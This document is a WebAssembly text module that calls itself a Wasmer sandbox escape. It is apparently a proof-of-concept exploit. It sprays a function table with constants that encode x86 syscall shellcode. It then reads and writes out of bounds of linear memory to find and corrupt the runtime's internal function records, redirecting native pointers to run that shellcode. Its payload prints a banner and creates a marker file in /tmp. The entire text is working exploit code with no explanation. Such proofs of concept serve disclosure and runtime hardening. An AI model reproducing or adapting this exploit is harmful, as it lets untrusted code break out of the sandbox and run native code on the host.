(module
  (type $target_t (func (param i64) (result i64)))
  (memory $m0 (export "memory") 1 1)
  (data (i32.const 0) "[NATIVE JIT] Wasmer sandbox escape!\n")
  (data (i32.const 64) "/tmp/wasmer-exploit-success\00")
  (table $targets 2097152 2097152 funcref)

  ;; At body+2: push 1; pop rdi; push 1; pop rax; syscall (write).
  (func $write_spray (type $target_t) (param i64) (result i64)
    (i64.const 364606857943122282))
  ;; At body+2: xchg rsi,rdi; push 2; pop rax; syscall (open).
  (func $open_spray (type $target_t) (param i64) (result i64)
    (i64.const 364606862248544072))
  (elem declare func $write_spray $open_spray)

  (func $main (export "_start")
    (local $probe i32)
    (local $cursor i32)
    (local $remaining i32)
    (local $index i32)
    (local $body i64)
    (local $vmctx i64)
    (local $result i64)

    (table.fill $targets
      (i32.const 0)
      (ref.func $write_spray)
      (i32.const 2097152))

    ;; offset=0xffffffff + zext(0x82000001) = 0x182000000.
    ;; The 64 MiB inline table grooms this probe into its repeated records.
    (local.set $probe (i32.const -2113929215))
    (local.set $cursor (local.get $probe))
    (local.set $body
      (i64.load offset=4294967295 (local.get $probe)))
    (local.set $vmctx
      (i64.load offset=4294967295
        (i32.add (local.get $probe) (i32.const 16))))

    ;; Validate adjacent 32-byte VMCallerCheckedAnyfunc records.
    (if
      (i32.or
        (i64.eqz (local.get $body))
        (i32.or
          (i64.ne (local.get $body)
            (i64.load offset=4294967295
              (i32.add (local.get $probe) (i32.const 32))))
          (i64.ne (local.get $vmctx)
            (i64.load offset=4294967295
              (i32.add (local.get $probe) (i32.const 48))))))
      (then unreachable))

    ;; Scan forward while the pinned repeated-body pattern holds. The following
    ;; VMMemoryDefinition sentinel is required before any mutation.
    (block $found_end
      (loop $scan
        (br_if $found_end
          (i64.ne (local.get $body)
            (i64.load offset=4294967295 (local.get $cursor))))
        (local.set $cursor
          (i32.add (local.get $cursor) (i32.const 32)))
        (local.set $remaining
          (i32.add (local.get $remaining) (i32.const 1)))
        (if (i32.gt_u (local.get $remaining) (i32.const 2097152))
          (then unreachable))
        (br $scan)))

    ;; Fixed anyfunc array ends at VMMemoryDefinition; require one page.
    (if
      (i64.ne
        (i64.load offset=4294967295
          (i32.add (local.get $cursor) (i32.const 8)))
        (i64.const 65536))
      (then unreachable))
    (local.set $index
      (i32.sub (i32.const 2097152) (local.get $remaining)))

    ;; Native write(1, m0, 36) through immediate bytes at P+2.
    (i64.store offset=4294967295
      (local.get $probe)
      (i64.add (local.get $body) (i64.const 2)))
    (local.set $result
      (call_indirect $targets (type $target_t)
        (i64.const 36)
        (local.get $index)))
    (if (i64.ne (local.get $result) (i64.const 36))
      (then unreachable))

    ;; Replace the banner with the marker path using ordinary in-bounds Wasm.
    (memory.copy $m0 $m0
      (i32.const 0) (i32.const 64) (i32.const 28))

    ;; Legitimately install the open-spray function, then corrupt only this
    ;; inline record's native pointer and hidden VMContext argument.
    (table.set $targets (local.get $index) (ref.func $open_spray))
    (local.set $body
      (i64.load offset=4294967295 (local.get $probe)))
    (if (i64.eqz (local.get $body)) (then unreachable))
    (i64.store offset=4294967295
      (local.get $probe)
      (i64.add (local.get $body) (i64.const 2)))
    ;; open(path=m0, flags=O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW|O_CLOEXEC,
    ;;      mode=0600). This refuses a pre-existing path or symlink.
    (i64.store offset=4294967295
      (i32.add (local.get $probe) (i32.const 16))
      (i64.const 655553))
    (local.set $result
      (call_indirect $targets (type $target_t)
        (i64.const 384)
        (local.get $index)))
    (if (i64.lt_s (local.get $result) (i64.const 0))
      (then unreachable)))
)
